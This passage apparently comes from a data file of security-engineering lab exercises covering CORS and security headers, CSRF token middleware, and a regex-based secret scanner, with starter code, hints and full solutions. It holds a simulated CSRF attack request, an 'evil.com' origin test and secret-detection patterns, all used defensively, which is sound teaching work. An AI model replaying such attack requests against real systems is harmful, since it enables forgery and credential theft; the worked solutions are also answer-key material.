print(f"Allowed origin:   {r1.headers.get('access-control-allow-origin', 'NOT SET')}")

# Test disallowed origin
r2 = client.get("/api/data", headers={"Origin": "https://evil.com"})
print(f"Disallowed origin: {r2.headers.get('access-control-allow-origin', 'BLOCKED')}")`,
        hints: [
          'Add CORSMiddleware before SecurityHeadersMiddleware — middleware executes in reverse registration order in Starlette',
          'With specific origins and allow_credentials=True, the ACAO header echoes back the request origin if it matches',
          'An unmatched origin returns no ACAO header, so the browser blocks the response'
        ],
        expectedOutput: `Allowed origin:   https://app.example.com
Disallowed origin: BLOCKED`,
        solution: `from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.testclient import TestClient

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "0"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; script-src 'self'; style-src 'self'; "
            "img-src 'self' data:; frame-ancestors 'none'"
        )
        response.headers["Strict-Transport-Security"] = (
            "max-age=63072000; includeSubDomains; preload"
        )
        response.headers["Permissions-Policy"] = (
            "camera=(), microphone=(), geolocation=()"
        )
        return response

app = FastAPI()

app.add_middleware(SecurityHeadersMiddleware)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com", "https://admin.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type", "X-CSRF-Token"],
)

@app.get("/api/data")
async def data():
    return {"secret": "only for allowed origins"}

client = TestClient(app, raise_server_exceptions=False)

r1 = client.get("/api/data", headers={"Origin": "https://app.example.com"})
print(f"Allowed origin:   {r1.headers.get('access-control-allow-origin', 'NOT SET')}")

r2 = client.get("/api/data", headers={"Origin": "https://evil.com"})
print(f"Disallowed origin: {r2.headers.get('access-control-allow-origin', 'BLOCKED')}")`
      },
      {
        title: 'Step 4: Audit Headers with a Policy Checker',
        instruction: `WHAT: Write a function that inspects an HTTP response's headers against a security policy checklist and reports missing or weak headers.

WHY: Even with middleware in place, misconfigurations can slip through during refactors or when third-party services handle certain paths. Automated policy checks in your CI pipeline catch regressions before they reach production.

HOW: Define a REQUIRED_HEADERS dict mapping header names to validation functions. Run the checker against a real (or simulated) response and produce a pass/fail report for each policy item.`,
        starterCode: `# Security Headers Lab — Step 4: Policy Audit
def audit_security_headers(headers: dict) -> list[dict]:
    """Check response headers against a security policy.

    Returns a list of findings:
      { "header": str, "status": "PASS" | "FAIL", "detail": str }
    """
    # TODO: Define checks for each required header.
    # Each check is a (expected_value_or_callable, failure_message) pair.
    POLICY = {
        "X-Frame-Options": ...,
        "X-Content-Type-Options": ...,
        "Strict-Transport-Security": ...,
        "Content-Security-Policy": ...,
        "Referrer-Policy": ...,
    }
    # TODO: Iterate and build findings list
    pass

# Test against a well-configured response
good_headers = {
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
    "Content-Security-Policy": "default-src 'self'; frame-ancestors 'none'",
    "Referrer-Policy": "strict-origin-when-cross-origin",
}

# Test against a poorly configured response
bad_headers = {
    "X-Frame-Options": "SAMEORIGIN",
    "Content-Security-Policy": "default-src *",
}

for label, hdrs in [("Good", good_headers), ("Bad", bad_headers)]:
    print(f"\\n--- {label} response ---")
    findings = audit_security_headers(hdrs)
    for f in findings:
        icon = "✓" if f["status"] == "PASS" else "✗"
        print(f"  {icon} {f['header']}: {f['detail']}")`,
        hints: [
          'Use headers.get("Header-Name") to safely retrieve values — returns None if missing',
          'For HSTS, check that max-age is at least 31536000 (1 year): int(re.search(r"max-age=(\\d+)", v).group(1)) >= 31536000',
          'For CSP, flag any policy containing "unsafe-inline", "unsafe-eval", or the wildcard "*"'
        ],
        expectedOutput: `--- Good response ---
  ✓ X-Frame-Options: DENY detected
  ✓ X-Content-Type-Options: nosniff set
  ✓ Strict-Transport-Security: max-age sufficient (63072000s)
  ✓ Content-Security-Policy: no unsafe directives detected
  ✓ Referrer-Policy: present

--- Bad response ---
  ✗ X-Frame-Options: expected DENY, got SAMEORIGIN
  ✗ X-Content-Type-Options: header missing
  ✗ Strict-Transport-Security: header missing
  ✗ Content-Security-Policy: wildcard (*) source detected
  ✗ Referrer-Policy: header missing`,
        solution: `import re

def audit_security_headers(headers: dict) -> list[dict]:
    findings = []

    def check(name, test_fn, pass_msg, fail_msg):
        val = headers.get(name)
        if val and test_fn(val):
            findings.append({"header": name, "status": "PASS", "detail": pass_msg})
        elif val:
            findings.append({"header": name, "status": "FAIL", "detail": fail_msg})
        else:
            findings.append({"header": name, "status": "FAIL", "detail": "header missing"})

    check("X-Frame-Options",
          lambda v: v.upper() == "DENY",
          "DENY detected",
          f"expected DENY, got {headers.get('X-Frame-Options')}")

    check("X-Content-Type-Options",
          lambda v: v.lower() == "nosniff",
          "nosniff set",
          "value is not nosniff")

    check("Strict-Transport-Security",
          lambda v: (m := re.search(r"max-age=(\\d+)", v)) and int(m.group(1)) >= 31536000,
          f"max-age sufficient ({headers.get('Strict-Transport-Security', '').split(';')[0].split('=')[-1]}s)",
          "max-age is less than 1 year")

    check("Content-Security-Policy",
          lambda v: not re.search(r"'unsafe-inline'|'unsafe-eval'|\\*", v),
          "no unsafe directives detected",
          "wildcard (*) source detected")

    check("Referrer-Policy",
          lambda v: bool(v),
          "present",
          "header missing")

    return findings

good_headers = {
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
    "Content-Security-Policy": "default-src 'self'; frame-ancestors 'none'",
    "Referrer-Policy": "strict-origin-when-cross-origin",
}

bad_headers = {
    "X-Frame-Options": "SAMEORIGIN",
    "Content-Security-Policy": "default-src *",
}

for label, hdrs in [("Good", good_headers), ("Bad", bad_headers)]:
    print(f"\\n--- {label} response ---")
    findings = audit_security_headers(hdrs)
    for f in findings:
        icon = "✓" if f["status"] == "PASS" else "✗"
        print(f"  {icon} {f['header']}: {f['detail']}")`
      }
    ]
  },

  // ============================================================
  // SEC-LAB-5: CSRF Protection Middleware (from se-4)
  // ============================================================
  {
    id: 'sec-lab-5',
    roleId: 'security-engineer',
    level: 'mid',
    title: 'CSRF Protection: Synchronizer Token Pattern',
    description: 'Implement Cross-Site Request Forgery protection using the synchronizer token pattern with constant-time comparison, SameSite cookies, and automatic token rotation.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before implementing CSRF protection, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete setup instructions. You will need: Python 3.10+, a virtual environment, and FastAPI. Install with `pip install fastapi`. The CSRF token logic uses only Python stdlib (secrets, hashlib, hmac).',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.10+',
          'Verify stdlib modules: `python -c "import secrets, hashlib, hmac; print(\'CSRF stdlib ready\')"`'
        ],
        expectedOutput: 'Python 3.10.x\nfastapi installed\nCSRF stdlib ready',
        solution: null
      },
      {
        title: 'Step 2: Understand the CSRF Threat Model',
        instruction: `WHAT: Model a CSRF attack in code to understand exactly what the middleware must block.

WHY: You cannot build effective defences without understanding the attack. CSRF (OWASP A01) tricks an authenticated user's browser into sending a state-changing request to your server using their session cookie — without their knowledge. The synchronizer token pattern defeats this because the attacker's page cannot read the token from your domain's cookie.

HOW: Simulate an attacker's page making a POST to your server. Observe that the session cookie is sent automatically (same-site=None scenario), but the CSRF token from the header is absent. The middleware must reject requests where the header token does not match the cookie token.`,
        starterCode: `# CSRF Lab — Step 2: Threat Model Simulation

def simulate_csrf_attack():
    """
    Demonstrate what a CSRF request looks like vs. a legitimate one.
    Return True if the request should be blocked, False if it should be allowed.
    """

    print("=== Legitimate Request ===")
    legitimate = {
        "method": "POST",
        "path": "/transfer",
        "cookies": {"session_id": "abc123", "csrf_token": "tok-xyz-789"},
        "headers": {
            "X-CSRF-Token": "tok-xyz-789",  # Token read from cookie by JS
            "Content-Type": "application/json"
        },
        "body": {"amount": 100, "to": "friend"}
    }

    print("=== CSRF Attack Request ===")
    attack = {
        "method": "POST",
        "path": "/transfer",
        "cookies": {"session_id": "abc123", "csrf_token": "tok-xyz-789"},  # Browser sends automatically
        "headers": {
            # Attacker's page CANNOT read csrf_token from a different origin
            "Content-Type": "application/json"
        },
        "body": {"amount": 9999, "to": "attacker"}
    }

    # TODO: Write a check_csrf(request) function that:
    #   1. Returns True (allowed) if request method is GET/HEAD/OPTIONS
    #   2. Returns True (allowed) if cookie token == header token (and both present)
    #   3. Returns False (blocked) otherwise

    for label, req in [("Legitimate", legitimate), ("Attack", attack)]:
        allowed = check_csrf(req)
        print(f"  {label}: {'ALLOWED' if allowed else 'BLOCKED'}")

simulate_csrf_attack()`,
        hints: [
          'SAFE_METHODS = {"GET", "HEAD", "OPTIONS"} — these do not change state so they do not need a CSRF token',
          'Compare tokens with == but be aware: use secrets.compare_digest() in production to prevent timing attacks',
          'The attacker controls the request headers but NOT the victim\'s cookies from your domain'
        ],
        expectedOutput: `=== Legitimate Request ===
=== CSRF Attack Request ===
  Legitimate: ALLOWED
  Attack: BLOCKED`,
        solution: `import secrets

SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}

def check_csrf(request: dict) -> bool:
    if request["method"] in SAFE_METHODS:
        return True
    cookie_token = request["cookies"].get("csrf_token")
    header_token = request["headers"].get("X-CSRF-Token")
    if not cookie_token or not header_token:
        return False
    return secrets.compare_digest(cookie_token, header_token)

def simulate_csrf_attack():
    print("=== Legitimate Request ===")
    legitimate = {
        "method": "POST",
        "path": "/transfer",
        "cookies": {"session_id": "abc123", "csrf_token": "tok-xyz-789"},
        "headers": {"X-CSRF-Token": "tok-xyz-789", "Content-Type": "application/json"},
        "body": {"amount": 100, "to": "friend"}
    }

    print("=== CSRF Attack Request ===")
    attack = {
        "method": "POST",
        "path": "/transfer",
        "cookies": {"session_id": "abc123", "csrf_token": "tok-xyz-789"},
        "headers": {"Content-Type": "application/json"},
        "body": {"amount": 9999, "to": "attacker"}
    }

    for label, req in [("Legitimate", legitimate), ("Attack", attack)]:
        allowed = check_csrf(req)
        print(f"  {label}: {'ALLOWED' if allowed else 'BLOCKED'}")

simulate_csrf_attack()`
      },
      {
        title: 'Step 3: Implement the CSRF Middleware',
        instruction: `WHAT: Build the full Starlette middleware that issues, validates, and rotates CSRF tokens on every state-changing request.

WHY: The middleware approach ensures CSRF protection is applied uniformly without requiring each endpoint to opt-in. Token rotation after each state-changing request (the "per-request token" pattern) further limits the window for token replay attacks.

HOW: On safe (GET/HEAD/OPTIONS) requests, issue a CSRF cookie if one does not already exist. On state-changing requests (POST/PUT/DELETE), compare the cookie token to the X-CSRF-Token header using secrets.compare_digest(). Rotate the cookie after each successful state-changing request.`,
        starterCode: `# CSRF Lab — Step 3: Full Middleware Implementation
import secrets
import hashlib
from fastapi import FastAPI
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class CSRFMiddleware(BaseHTTPMiddleware):
    SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
    TOKEN_HEADER = "X-CSRF-Token"
    COOKIE_NAME = "csrf_token"

    def __init__(self, app, secret_key: str):
        super().__init__(app)
        self.secret_key = secret_key

    def _generate_token(self) -> str:
        """Generate a cryptographically secure CSRF token."""
        # TODO: Use secrets.token_bytes(32), then hash with the secret_key
        pass

    def _tokens_match(self, a: str, b: str) -> bool:
        """Constant-time comparison to prevent timing side-channel attacks."""
        # TODO: Use secrets.compare_digest()
        pass

    async def dispatch(self, request: Request, call_next):
        # TODO:
        # 1. If safe method: call next, set CSRF cookie if absent, return response
        # 2. If state-changing method:
        #    a. Read cookie token and header token
        #    b. If either is missing: return 403
        #    c. If tokens don't match: return 403
        #    d. Call next, rotate CSRF cookie, return response
        pass

app = FastAPI()
app.add_middleware(CSRFMiddleware, secret_key="test-secret-key-32-chars-minimum!")

@app.get("/ping")
async def ping():
    return {"pong": True}

@app.post("/transfer")
async def transfer(request: Request):
    body = await request.json()
    return {"status": "transferred", "amount": body.get("amount")}

from starlette.testclient import TestClient
client = TestClient(app, raise_server_exceptions=False)

# GET sets the cookie
r = client.get("/ping")
csrf_token = r.cookies.get("csrf_token", "")
print(f"GET /ping    → cookie set: {'yes' if csrf_token else 'no'}")

# POST with valid token
r2 = client.post("/transfer", json={"amount": 50},
                 headers={"X-CSRF-Token": csrf_token},
                 cookies={"csrf_token": csrf_token})
print(f"POST valid   → {r2.status_code}")

# POST without token
r3 = client.post("/transfer", json={"amount": 50})
print(f"POST no token → {r3.status_code}")`,
        hints: [
          'Generate the token: hashlib.sha256(secrets.token_bytes(32) + self.secret_key.encode()).hexdigest()',
          'Set cookies with: response.set_cookie(key=self.COOKIE_NAME, value=token, httponly=False, samesite="strict", secure=True, max_age=3600)',
          'Return JSONResponse(status_code=403, content={"detail": "..."}) for CSRF failures'
        ],
        expectedOutput: `GET /ping    → cookie set: yes
POST valid   → 200
POST no token → 403`,
        solution: `import secrets
import hashlib
from fastapi import FastAPI
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class CSRFMiddleware(BaseHTTPMiddleware):
    SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
    TOKEN_HEADER = "X-CSRF-Token"
    COOKIE_NAME = "csrf_token"

    def __init__(self, app, secret_key: str):
        super().__init__(app)
        self.secret_key = secret_key

    def _generate_token(self) -> str:
        random_bytes = secrets.token_bytes(32)
        return hashlib.sha256(random_bytes + self.secret_key.encode()).hexdigest()

    def _tokens_match(self, a: str, b: str) -> bool:
        return secrets.compare_digest(a, b)

    async def dispatch(self, request: Request, call_next):
        if request.method in self.SAFE_METHODS:
            response = await call_next(request)
            if self.COOKIE_NAME not in request.cookies:
                token = self._generate_token()
                response.set_cookie(key=self.COOKIE_NAME, value=token,
                                    httponly=False, samesite="strict",
                                    secure=True, max_age=3600)
            return response

        cookie_token = request.cookies.get(self.COOKIE_NAME)
        header_token = request.headers.get(self.TOKEN_HEADER)

        if not cookie_token or not header_token:
            return JSONResponse(status_code=403,
                                content={"detail": "CSRF token missing"})

        if not self._tokens_match(cookie_token, header_token):
            return JSONResponse(status_code=403,
                                content={"detail": "CSRF token mismatch"})

        response = await call_next(request)
        new_token = self._generate_token()
        response.set_cookie(key=self.COOKIE_NAME, value=new_token,
                            httponly=False, samesite="strict",
                            secure=True, max_age=3600)
        return response

app = FastAPI()
app.add_middleware(CSRFMiddleware, secret_key="test-secret-key-32-chars-minimum!")

@app.get("/ping")
async def ping():
    return {"pong": True}

@app.post("/transfer")
async def transfer(request: Request):
    body = await request.json()
    return {"status": "transferred", "amount": body.get("amount")}

from starlette.testclient import TestClient
client = TestClient(app, raise_server_exceptions=False)

r = client.get("/ping")
csrf_token = r.cookies.get("csrf_token", "")
print(f"GET /ping    → cookie set: {'yes' if csrf_token else 'no'}")

r2 = client.post("/transfer", json={"amount": 50},
                 headers={"X-CSRF-Token": csrf_token},
                 cookies={"csrf_token": csrf_token})
print(f"POST valid   → {r2.status_code}")

r3 = client.post("/transfer", json={"amount": 50})
print(f"POST no token → {r3.status_code}")`
      },
      {
        title: 'Step 4: Add a Webhook Bypass Allowlist',
        instruction: `WHAT: Extend the CSRF middleware to allow specific paths (like /webhooks) to bypass CSRF validation — useful for receiving signed payloads from third-party services.

WHY: Webhook endpoints receive requests from external servers that cannot obtain a CSRF cookie. Instead, they use HMAC signature verification (a separate defence). Blocking them in CSRF middleware would break third-party integrations. The bypass list must be explicit and narrow — never use a wildcard pattern.

HOW: Accept an exempt_paths set in the middleware constructor. Before the CSRF check, compare request.url.path against the set. Exempt paths still reach the endpoint handler where they should perform their own signature validation.`,
        starterCode: `# CSRF Lab — Step 4: Webhook Bypass
import secrets
import hashlib
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware

class CSRFMiddleware(BaseHTTPMiddleware):
    SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
    TOKEN_HEADER = "X-CSRF-Token"
    COOKIE_NAME = "csrf_token"

    def __init__(self, app, secret_key: str, exempt_paths: set[str] = None):
        super().__init__(app)
        self.secret_key = secret_key
        # TODO: Store exempt_paths (default to empty set if None)

    def _generate_token(self) -> str:
        return hashlib.sha256(
            secrets.token_bytes(32) + self.secret_key.encode()
        ).hexdigest()

    def _tokens_match(self, a: str, b: str) -> bool:
        return secrets.compare_digest(a, b)

    async def dispatch(self, request: Request, call_next):
        # TODO: If request.url.path is in self.exempt_paths, skip CSRF check
        # Otherwise apply the full CSRF logic from Step 3
        pass

app = FastAPI()
app.add_middleware(
    CSRFMiddleware,
    secret_key="test-secret-key-32-chars-minimum!",
    exempt_paths={"/webhooks/github", "/webhooks/stripe"}
)

@app.post("/webhooks/github")
async def github_webhook(request: Request):
    # In production: verify X-Hub-Signature-256 header here
    return {"received": True}

@app.post("/transfer")
async def transfer():
    return {"status": "ok"}

from starlette.testclient import TestClient
client = TestClient(app, raise_server_exceptions=False)

# Webhook with no CSRF token — should be allowed (bypassed)
r1 = client.post("/webhooks/github", json={"event": "push"})
print(f"Webhook (no CSRF): {r1.status_code}")

# Regular POST with no CSRF token — should be blocked
r2 = client.post("/transfer", json={"amount": 50})
print(f"Transfer (no CSRF): {r2.status_code}")`,
        hints: [
          'self.exempt_paths = exempt_paths or set() in __init__',
          'Check at the top of dispatch: if request.url.path in self.exempt_paths: return await call_next(request)',
          'Never use startswith() for the exempt check — an attacker could register /webhooks.evil path'
        ],
        expectedOutput: `Webhook (no CSRF): 200
Transfer (no CSRF): 403`,
        solution: `import secrets
import hashlib
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware

class CSRFMiddleware(BaseHTTPMiddleware):
    SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
    TOKEN_HEADER = "X-CSRF-Token"
    COOKIE_NAME = "csrf_token"

    def __init__(self, app, secret_key: str, exempt_paths: set = None):
        super().__init__(app)
        self.secret_key = secret_key
        self.exempt_paths = exempt_paths or set()

    def _generate_token(self) -> str:
        return hashlib.sha256(
            secrets.token_bytes(32) + self.secret_key.encode()
        ).hexdigest()

    def _tokens_match(self, a: str, b: str) -> bool:
        return secrets.compare_digest(a, b)

    async def dispatch(self, request: Request, call_next):
        if request.url.path in self.exempt_paths:
            return await call_next(request)

        if request.method in self.SAFE_METHODS:
            response = await call_next(request)
            if self.COOKIE_NAME not in request.cookies:
                response.set_cookie(key=self.COOKIE_NAME,
                                    value=self._generate_token(),
                                    httponly=False, samesite="strict",
                                    secure=True, max_age=3600)
            return response

        cookie_token = request.cookies.get(self.COOKIE_NAME)
        header_token = request.headers.get(self.TOKEN_HEADER)

        if not cookie_token or not header_token:
            return JSONResponse(status_code=403, content={"detail": "CSRF token missing"})

        if not self._tokens_match(cookie_token, header_token):
            return JSONResponse(status_code=403, content={"detail": "CSRF token mismatch"})

        response = await call_next(request)
        response.set_cookie(key=self.COOKIE_NAME, value=self._generate_token(),
                            httponly=False, samesite="strict", secure=True, max_age=3600)
        return response

app = FastAPI()
app.add_middleware(CSRFMiddleware, secret_key="test-secret-key-32-chars-minimum!",
                  exempt_paths={"/webhooks/github", "/webhooks/stripe"})

@app.post("/webhooks/github")
async def github_webhook(request: Request):
    return {"received": True}

@app.post("/transfer")
async def transfer():
    return {"status": "ok"}

from starlette.testclient import TestClient
client = TestClient(app, raise_server_exceptions=False)

r1 = client.post("/webhooks/github", json={"event": "push"})
print(f"Webhook (no CSRF): {r1.status_code}")

r2 = client.post("/transfer", json={"amount": 50})
print(f"Transfer (no CSRF): {r2.status_code}")`
      }
    ]
  },

  // ============================================================
  // SEC-LAB-6: Secret Scanning Script (from se-5)
  // ============================================================
  {
    id: 'sec-lab-6',
    roleId: 'security-engineer',
    level: 'senior',
    title: 'Secret Scanning: Detect Hardcoded Credentials',
    description: 'Build a production-grade secret scanner that detects hardcoded credentials in source code using severity-ranked regex patterns, masked output, and a CI-ready exit code.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before building a secret scanner, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete setup instructions. You will need: Python 3.10+ and a virtual environment. This lab uses only the Python standard library (re, os, json) — no external packages are required.',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.10+',
          'Create a venv: `python -m venv .venv && source .venv/bin/activate`'
        ],
        expectedOutput: 'Python 3.10.x\nVirtual environment activated: (.venv)',
        solution: null
      },
      {
        title: 'Step 2: Define Secret Detection Patterns',
        instruction: `WHAT: Build a dictionary of regex patterns for common secret types, each with a severity level.

WHY: Hardcoded secrets are one of the most common and impactful vulnerabilities in real codebases. Supply chain security (OWASP A08) starts with ensuring credentials never enter version control. A well-designed pattern library catches AWS keys, GitHub tokens, database connection strings, and private keys before they are committed.

HOW: Use Python's re module with named capture groups. Assign severity levels (critical, high, medium) based on potential blast radius. Test each pattern against representative positive and negative samples to minimise false positives.`,
        starterCode: `# Secret Scanner — Step 2: Pattern Library
import re
from dataclasses import dataclass

@dataclass
class SecretFinding:
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

# TODO: Build SECRET_PATTERNS dict with at least 5 entries:
# Format: { "Pattern Name": {"regex": r"...", "severity": "critical|high|medium"} }
# Required patterns:
#   - AWS Access Key (AKIA...)
#   - GitHub Token (ghp_, gho_, ghs_, ghr_)
#   - Generic API Key (api_key = "...")
#   - Private Key Header (-----BEGIN ... PRIVATE KEY-----)
#   - Database Connection String (postgres://, mysql://, mongodb://)

SECRET_PATTERNS = {}  # Replace with your patterns

def mask_secret(text: str) -> str:
    """Show first 6 and last 4 chars, mask the middle."""
    # TODO: If len(text) > 12, return text[:6] + "***" + text[-4:]
    #       Otherwise return "***"
    pass

# Test your patterns
test_lines = [
    (1, 'aws_key = "AKIAIOSFODNN7EXAMPLE"'),
    (2, 'token = "ghp_abc123def456ghi789jkl012mno345"'),
    (3, 'api_key = "sk-proj-abcdef1234567890abcdef"'),
    (4, '# This is a normal comment'),
    (5, 'DB_URL = "postgres://admin:s3cr3t@db.prod.com/mydb"'),
]

for line_num, line in test_lines:
    for name, config in SECRET_PATTERNS.items():
        m = re.search(config["regex"], line)
        if m:
            masked = mask_secret(m.group())
            print(f"  Line {line_num} [{config['severity'].upper()}] {name}: {masked}")`,
        hints: [
          'AWS Access Key: r"AKIA[0-9A-Z]{16}"',
          'GitHub Token: r"gh[pousr]_[A-Za-z0-9_]{20,}"',
          'Database URL: r"(?i)(?:postgres|mysql|mongodb)://[^\\s:]+:[^@\\s]+@[^\\s\'\\"]+"`'
        ],
        expectedOutput: `  Line 1 [CRITICAL] AWS Access Key: AKIAIO***MPLE
  Line 2 [CRITICAL] GitHub Token: ghp_ab***0345
  Line 3 [HIGH] Generic API Key: sk-pro***cdef
  Line 5 [HIGH] Database Connection String: postgr***mydb`,
        solution: `import re
from dataclasses import dataclass

@dataclass
class SecretFinding:
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

SECRET_PATTERNS = {
    "AWS Access Key": {
        "regex": r"AKIA[0-9A-Z]{16}",
        "severity": "critical"
    },
    "GitHub Token": {
        "regex": r"gh[pousr]_[A-Za-z0-9_]{20,}",
        "severity": "critical"
    },
    "Generic API Key": {
        "regex": r"(?i)(?:api[_-]?key|apikey)\\s*[=:]\\s*['\\""]([A-Za-z0-9\\-_]{20,})['\\""]",
        "severity": "high",
        "group": 1
    },
    "Private Key Header": {
        "regex": r"-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----",
        "severity": "critical"
    },
    "Database Connection String": {
        "regex": r"(?i)(?:postgres|mysql|mongodb)://[^\\s:]+:[^@\\s]+@[^\\s'\\"]+",
        "severity": "high"
    },
}

def mask_secret(text: str) -> str:
    if len(text) > 12:
        return text[:6] + "***" + text[-4:]
    return "***"

test_lines = [
    (1, 'aws_key = "AKIAIOSFODNN7EXAMPLE"'),
    (2, 'token = "ghp_abc123def456ghi789jkl012mno345"'),
    (3, 'api_key = "sk-proj-abcdef1234567890abcdef"'),
    (4, '# This is a normal comment'),
    (5, 'DB_URL = "postgres://admin:s3cr3t@db.prod.com/mydb"'),
]

for line_num, line in test_lines:
    for name, config in SECRET_PATTERNS.items():
        m = re.search(config["regex"], line)
        if m:
            masked = mask_secret(m.group(config.get("group", 0)))
            print(f"  Line {line_num} [{config['severity'].upper()}] {name}: {masked}")`
      },
      {
        title: 'Step 3: Implement the File and Directory Scanner',
        instruction: `WHAT: Build scanner functions that walk a directory tree, skip known-safe directories (node_modules, .git), and produce a list of SecretFinding objects.

WHY: The scanner must be fast enough to run in CI pipelines (pre-commit hooks, PR checks) where developer experience depends on sub-second feedback. Skipping irrelevant directories and limiting file extensions reduces noise and speeds up the scan significantly.

HOW: Use os.walk() to traverse the directory. Prune SKIP_DIRS using dirnames[:] = [...]. Filter files by extension using pathlib.Path.suffix. Open files with errors="ignore" to handle binary files gracefully.`,
        starterCode: `# Secret Scanner — Step 3: Directory Walker
import re
import os
from pathlib import Path
from dataclasses import dataclass

@dataclass
class SecretFinding:
    file_path: str
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

SECRET_PATTERNS = {
    "AWS Access Key": {"regex": r"AKIA[0-9A-Z]{16}", "severity": "critical"},
    "GitHub Token":   {"regex": r"gh[pousr]_[A-Za-z0-9_]{20,}", "severity": "critical"},
    "Private Key":    {"regex": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", "severity": "critical"},
}

SCAN_EXTENSIONS = {".py", ".js", ".ts", ".json", ".yaml", ".yml", ".env", ".cfg", ".toml"}
SKIP_DIRS = {"node_modules", ".git", "__pycache__", "venv", ".venv", "dist", "build"}

def mask_secret(text: str) -> str:
    return text[:6] + "***" + text[-4:] if len(text) > 12 else "***"

def scan_file(file_path: str) -> list[SecretFinding]:
    """Scan a single file and return all findings."""
    # TODO: Open the file with encoding='utf-8', errors='ignore'
    #       Enumerate lines, run each pattern, collect SecretFinding objects
    #       Handle PermissionError and OSError gracefully (return empty list)
    pass

def scan_directory(root_path: str) -> list[SecretFinding]:
    """Recursively scan a directory, skipping SKIP_DIRS and non-code files."""
    # TODO: Use os.walk(), prune dirnames, filter by SCAN_EXTENSIONS
    pass

# Test by creating a temp file and scanning it
import tempfile
sample = 'token = "ghp_abc123def456ghi789jkl012mno345pqr"\\n'
with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
    f.write(sample)
    tmp_path = f.name

findings = scan_file(tmp_path)
for fi in findings:
    print(f"  [{fi.severity.upper()}] {fi.pattern_name} at line {fi.line_number}: {fi.masked_text}")
os.unlink(tmp_path)`,
        hints: [
          'Open files with: open(file_path, "r", encoding="utf-8", errors="ignore")',
          'Prune dirs in-place: dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]',
          'Check extension: if Path(filename).suffix in SCAN_EXTENSIONS'
        ],
        expectedOutput: `  [CRITICAL] GitHub Token at line 1: ghp_ab***5pqr`,
        solution: `import re
import os
from pathlib import Path
from dataclasses import dataclass

@dataclass
class SecretFinding:
    file_path: str
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

SECRET_PATTERNS = {
    "AWS Access Key": {"regex": r"AKIA[0-9A-Z]{16}", "severity": "critical"},
    "GitHub Token":   {"regex": r"gh[pousr]_[A-Za-z0-9_]{20,}", "severity": "critical"},
    "Private Key":    {"regex": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", "severity": "critical"},
}

SCAN_EXTENSIONS = {".py", ".js", ".ts", ".json", ".yaml", ".yml", ".env", ".cfg", ".toml"}
SKIP_DIRS = {"node_modules", ".git", "__pycache__", "venv", ".venv", "dist", "build"}

def mask_secret(text: str) -> str:
    return text[:6] + "***" + text[-4:] if len(text) > 12 else "***"

def scan_file(file_path: str) -> list:
    findings = []
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line_num, line in enumerate(f, start=1):
                for name, config in SECRET_PATTERNS.items():
                    for m in re.finditer(config["regex"], line):
                        findings.append(SecretFinding(
                            file_path=file_path,
                            line_number=line_num,
                            pattern_name=name,
                            severity=config["severity"],
                            masked_text=mask_secret(m.group())
                        ))
    except (PermissionError, OSError):
        pass
    return findings

def scan_directory(root_path: str) -> list:
    all_findings = []
    for dirpath, dirnames, filenames in os.walk(root_path):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for filename in filenames:
            if Path(filename).suffix in SCAN_EXTENSIONS:
                findings = scan_file(os.path.join(dirpath, filename))
                all_findings.extend(findings)
    return all_findings

import tempfile
sample = 'token = "ghp_abc123def456ghi789jkl012mno345pqr"\\n'
with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
    f.write(sample)
    tmp_path = f.name

findings = scan_file(tmp_path)
for fi in findings:
    print(f"  [{fi.severity.upper()}] {fi.pattern_name} at line {fi.line_number}: {fi.masked_text}")
os.unlink(tmp_path)`
      },
      {
        title: 'Step 4: Build a CI-Ready Report with Exit Codes',
        instruction: `WHAT: Write a report formatter and a main() entry point that exits with code 1 when critical or high findings are present — making the scanner suitable for use in CI/CD pipelines.

